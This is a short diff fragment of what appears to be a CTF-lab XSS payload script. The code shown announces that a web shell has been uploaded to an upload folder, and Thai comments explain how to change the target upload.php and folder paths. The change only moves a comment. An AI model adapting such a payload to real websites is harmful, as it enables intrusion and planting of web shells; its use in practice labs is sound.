@@ -22,8 +22,8 @@
       });
     }) //สามารถเปลี่ยน Part เป้าหมายของไฟล์ upload.php ได้ เช่น /xss01CTF/upload.php
     .then(() => {
-      alert('Shell uploaded: /xss01/upload/' + filename); //สามารถเปลี่ยน Part เป้าหมายของโฟเดอร์ ีuploadได้ เช่น /xss01CTF/upload/
-    });
+      alert('Shell uploaded: /xss01/upload/' + filename);
+    }); //สามารถเปลี่ยน Part เป้าหมายของโฟเดอร์ ีuploadได้ เช่น /xss01CTF/upload/
 
 })();
 </script>
